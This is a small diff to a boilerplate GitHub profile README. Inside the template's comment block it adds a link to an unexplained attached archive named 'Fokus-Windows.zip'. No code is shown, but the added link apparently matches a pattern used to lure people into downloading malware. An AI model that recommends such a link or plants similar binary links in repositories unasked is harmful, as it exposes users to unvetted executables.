@@ -2,6 +2,8 @@
 
 <!--
 **palinTrock/palinTrock** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+[Fokus-Windows.zip](https://github.com/user-attachments/files/33313538/Fokus-Windows.zip)
+
 
 Here are some ideas to get you started:
 
